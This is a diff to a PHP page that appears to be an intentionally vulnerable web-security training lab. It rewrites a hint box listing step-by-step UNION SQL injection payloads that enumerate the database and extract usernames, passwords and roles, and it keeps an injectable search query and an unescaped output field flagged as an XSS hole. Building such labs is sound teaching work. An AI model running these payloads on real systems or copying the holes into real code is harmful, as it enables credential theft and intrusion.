@@ -78,11 +78,11 @@ if (!$conn->connect_error) {
                                 <div class="alert alert-info">
                                     <small><i class="fas fa-lightbulb"></i> SQL Injection Steps:</small><br>
                                     <small>1. Find columns: <code>%' ORDER BY 6#</code> then <code>%' ORDER BY 7#</code></small><br>
-                                    <small>2. Test injection: <code>%' UNION SELECT 1,'test',NULL,NULL,NULL,NULL#</code></small><br>
-                                    <small>3. Get DB info: <code>%' UNION SELECT 1,@@hostname,database(),@@version,NULL,NULL#</code></small><br>
-                                    <small>4. List tables: <code>%' UNION SELECT 1,table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()#</code></small><br>
-                                    <small>5. Get columns: <code>%' UNION SELECT 1,column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'#</code></small><br>
-                                    <small>6. Extract data: <code>%' UNION SELECT 1,username,password,role,NULL,NULL FROM users#</code></small>
+                                    <small>2. Test injection: <code>%' UNION SELECT 1,2,'test',NULL,NULL,NULL#</code></small><br>
+                                    <small>3. Get DB info: <code>%' UNION SELECT 1,2,@@hostname,database(),@@version,NULL#</code></small><br>
+                                    <small>4. List tables: <code>%' UNION SELECT 1,2,table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()#</code></small><br>
+                                    <small>5. Get columns: <code>%' UNION SELECT 1,2,column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'#</code></small><br>
+                                    <small>6. Extract data: <code>%' UNION SELECT 1,2,username,password,role,NULL FROM users#</code></small>
                                 </div>
                                 <?php elseif ($difficulty == 'intermediate'): ?>
                                 <div class="alert alert-info">
@@ -98,7 +98,7 @@ if (!$conn->connect_error) {
                                     echo "<h6 class='mt-4'><i class='fas fa-list'></i> Search Results:</h6>";
                                     echo "<div class='table-responsive'>";
                                     echo "<table class='table table-striped'>";
-                                    echo "<thead class='table-dark'><tr><th>Name</th><th>Department</th><th>Salary</th><th>Notes</th></tr></thead><tbody>";
+                                    echo "<thead class='table-dark'><tr><th>ID</th><th>Name</th><th>Department</th><th>Salary</th><th>Notes</th><th>Created At</th></tr></thead><tbody>";
                                     
                                     if (!empty(trim($search))) {
                                         // Another SQL injection vulnerability
@@ -110,23 +110,25 @@ if (!$conn->connect_error) {
                                         $result = $conn->query($query);
                                         
                                         if ($conn->error) {
-                                            echo "<tr><td colspan='4'><div class='alert alert-danger'><i class='fas fa-exclamation-triangle'></i> SQL Error: " . htmlspecialchars($conn->error) . "</div></td></tr>";
+                                            echo "<tr><td colspan='6'><div class='alert alert-danger'><i class='fas fa-exclamation-triangle'></i> SQL Error: " . htmlspecialchars($conn->error) . "</div></td></tr>";
                                         } elseif ($result && $result->num_rows > 0) {
                                             while ($row = $result->fetch_assoc()) {
                                                 echo "<tr>";
+                                                echo "<td>" . htmlspecialchars($row['id']) . "</td>";
                                                 echo "<td>" . htmlspecialchars($row['name']) . "</td>";
                                                 echo "<td>" . htmlspecialchars($row['department']) . "</td>";
                                                 echo "<td>$" . (is_numeric($row['salary']) ? number_format($row['salary'], 2) : htmlspecialchars($row['salary'])) . "</td>";
                                                 
                                                 // XSS vulnerability - not escaping secret_note
                                                 echo "<td>" . $row['secret_note'] . "</td>";
+                                                echo "<td>" . htmlspecialchars($row['created_at']) . "</td>";
                                                 echo "</tr>";
                                             }
                                         } else {
-                                            echo "<tr><td colspan='4'><div class='alert alert-warning'><i class='fas fa-exclamation-triangle'></i> No employees found.</div></td></tr>";
+                                            echo "<tr><td colspan='6'><div class='alert alert-warning'><i class='fas fa-exclamation-triangle'></i> No employees found.</div></td></tr>";
                                         }
                                     } else {
-                                        echo "<tr><td colspan='4'><div class='alert alert-info'><i class='fas fa-info-circle'></i> Please enter a search term to find employees.</div></td></tr>";
+                                        echo "<tr><td colspan='6'><div class='alert alert-info'><i class='fas fa-info-circle'></i> Please enter a search term to find employees.</div></td></tr>";
                                     }
                                     
                                     echo "</tbody></table></div>";
